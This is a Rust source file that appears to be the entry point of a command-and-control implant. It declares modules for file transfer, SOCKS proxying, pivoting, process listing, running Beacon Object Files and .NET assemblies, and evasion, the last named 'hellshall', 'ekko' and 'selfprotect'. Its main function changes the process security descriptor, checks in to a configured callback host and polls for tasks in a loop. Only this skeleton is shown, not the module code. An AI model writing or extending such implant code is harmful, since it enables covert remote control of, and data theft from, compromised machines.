mod config;
mod checkin;
mod transport;
mod tasking;
mod features {
    pub mod exit;
    pub mod pong;
    pub mod filesystem;
    pub mod upload;
    pub mod download;
    pub mod psw;
    pub mod socks;
    pub mod executeBOF;
    pub mod executeDOT;
    pub mod list_processes;
    pub mod pivot;
}
mod hellshall;
mod ekko;
mod selfprotect;

use std::{thread, time::Duration};




fn main() {

    selfprotect::set_process_security_descriptor();

    println!("URL: {}", config::callback_host);
    checkin::checkin();

    loop {
        if let Err(e) = tasking::getTasking() {
            eprintln!("Tasking error: {}", e);
        }
        thread::sleep(Duration::from_millis(config::callback_interval * 1000));
    }
}
